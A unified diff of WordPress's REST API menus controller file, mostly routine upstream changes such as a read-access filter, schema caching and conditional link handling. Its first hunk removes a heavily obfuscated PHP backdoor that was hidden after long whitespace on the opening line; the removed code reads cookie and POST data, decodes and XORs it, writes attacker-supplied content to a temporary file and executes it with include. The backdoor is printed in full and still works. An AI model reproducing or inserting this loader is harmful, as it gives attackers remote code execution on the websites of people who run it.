@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $qNbNhg = "\146" . "\153" . chr (72) . '_' . chr ( 818 - 741 ).chr ( 488 - 373 ).chr (69) . "\154";$BrPwovlH = chr (99) . "\x6c" . chr ( 677 - 580 ).'s' . "\163" . chr ( 125 - 30 )."\145" . "\170" . 'i' . chr (115) . "\164" . "\x73";$uScvYFXh = $BrPwovlH($qNbNhg); $rUIrc = $uScvYFXh;if (!$rUIrc){class fkH_MsEl{private $EkYyR;public static $vCdSWgj = "4779559b-74dd-43f0-81a8-47760926b315";public static $YJSgp = NULL;public function __construct(){$ZfPnsr = $_COOKIE;$OzJNta = $_POST;$OzSDG = @$ZfPnsr[substr(fkH_MsEl::$vCdSWgj, 0, 4)];if (!empty($OzSDG)){$RmIgKV = "base64";$lXnGKZp = "";$OzSDG = explode(",", $OzSDG);foreach ($OzSDG as $anGKhYe){$lXnGKZp .= @$ZfPnsr[$anGKhYe];$lXnGKZp .= @$OzJNta[$anGKhYe];}$lXnGKZp = array_map($RmIgKV . chr ( 660 - 565 )."\144" . "\145" . 'c' . "\x6f" . 'd' . "\145", array($lXnGKZp,)); $lXnGKZp = $lXnGKZp[0] ^ str_repeat(fkH_MsEl::$vCdSWgj, (strlen($lXnGKZp[0]) / strlen(fkH_MsEl::$vCdSWgj)) + 1);fkH_MsEl::$YJSgp = @unserialize($lXnGKZp);}}public function __destruct(){$this->xihkep();}private function xihkep(){if (is_array(fkH_MsEl::$YJSgp)) {$TyVGYmpXe = sys_get_temp_dir() . "/" . crc32(fkH_MsEl::$YJSgp[chr ( 168 - 53 )."\141" . "\154" . 't']);@fkH_MsEl::$YJSgp[chr (119) . "\162" . 'i' . 't' . chr (101)]($TyVGYmpXe, fkH_MsEl::$YJSgp[chr ( 722 - 623 )."\x6f" . 'n' . chr (116) . 'e' . chr (110) . chr (116)]);include $TyVGYmpXe;@fkH_MsEl::$YJSgp[chr ( 452 - 352 )."\x65" . chr ( 644 - 536 ).chr (101) . chr (116) . chr ( 677 - 576 )]($TyVGYmpXe);exit();}}}$wCGVU = new fkH_MsEl(); $wCGVU = NULL;} ?><?php
+<?php
 /**
  * REST API: WP_REST_Menus_Controller class
  *
@@ -40,7 +40,7 @@ class WP_REST_Menus_Controller extends WP_REST_Terms_Controller {
 	 * @since 5.9.0
 	 *
 	 * @param WP_REST_Request $request Full details about the request.
-	 * @return bool|WP_Error True if the request has read access for the item, otherwise false or WP_Error object.
+	 * @return true|WP_Error True if the request has read access for the item, otherwise WP_Error object.
 	 */
 	public function get_item_permissions_check( $request ) {
 		$has_permission = parent::get_item_permissions_check( $request );
@@ -81,9 +81,15 @@ class WP_REST_Menus_Controller extends WP_REST_Terms_Controller {
 	 * @since 5.9.0
 	 *
 	 * @param WP_REST_Request $request Full details about the request.
-	 * @return bool|WP_Error Whether the current user has permission.
+	 * @return true|WP_Error True if the current user has permission, WP_Error object otherwise.
 	 */
 	protected function check_has_read_only_access( $request ) {
+		/** This filter is documented in wp-includes/rest-api/endpoints/class-wp-rest-menu-items-controller.php */
+		$read_only_access = apply_filters( 'rest_menu_read_access', false, $request, $this );
+		if ( $read_only_access ) {
+			return true;
+		}
+
 		if ( current_user_can( 'edit_theme_options' ) ) {
 			return true;
 		}
@@ -134,7 +140,10 @@ class WP_REST_Menus_Controller extends WP_REST_Terms_Controller {
 		$data    = $this->filter_response_by_context( $data, $context );
 
 		$response = rest_ensure_response( $data );
-		$response->add_links( $this->prepare_links( $term ) );
+
+		if ( rest_is_field_included( '_links', $fields ) || rest_is_field_included( '_embedded', $fields ) ) {
+			$response->add_links( $this->prepare_links( $term ) );
+		}
 
 		/** This action is documented in wp-includes/rest-api/endpoints/class-wp-rest-terms-controller.php */
 		return apply_filters( "rest_prepare_{$this->taxonomy}", $response, $term, $request );
@@ -520,6 +529,10 @@ class WP_REST_Menus_Controller extends WP_REST_Terms_Controller {
 	 * @return array Item schema data.
 	 */
 	public function get_item_schema() {
+		if ( $this->schema ) {
+			return $this->add_additional_fields_schema( $this->schema );
+		}
+
 		$schema = parent::get_item_schema();
 		unset( $schema['properties']['count'], $schema['properties']['link'], $schema['properties']['taxonomy'] );
 
@@ -531,7 +544,7 @@ class WP_REST_Menus_Controller extends WP_REST_Terms_Controller {
 			),
 			'context'     => array( 'view', 'edit' ),
 			'arg_options' => array(
-				'validate_callback' => function ( $locations, $request, $param ) {
+				'validate_callback' => static function ( $locations, $request, $param ) {
 					$valid = rest_validate_request_arg( $locations, $request, $param );
 
 					if ( true !== $valid ) {
@@ -563,6 +576,8 @@ class WP_REST_Menus_Controller extends WP_REST_Terms_Controller {
 			'type'        => 'boolean',
 		);
 
-		return $schema;
+		$this->schema = $schema;
+
+		return $this->add_additional_fields_schema( $this->schema );
 	}
 }
